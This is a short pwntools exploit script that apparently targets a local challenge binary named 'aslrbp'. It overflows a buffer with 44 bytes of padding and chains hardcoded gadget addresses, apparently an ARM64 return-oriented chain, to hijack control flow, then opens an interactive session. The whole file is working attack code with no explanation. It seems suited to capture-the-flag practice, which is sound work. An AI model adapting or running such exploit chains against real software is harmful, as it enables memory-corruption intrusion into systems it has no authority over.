from pwn import *

#context.log_level = "DEBUG"
p = process(["./aslrbp", "./11"])

main = p64(0x100003F1C)
ldp = p64(0x100003EFC)
ls = p64(0x100008000)

payload = b"A"*44
payload += ldp + b"A"*8 + p64(0x10) + main + b"A"*32
payload += ldp + ls + p64(0xFFFFFFFFFFFFFFC0)

p.sendlineafter(b"lol", payload)
p.interactive()
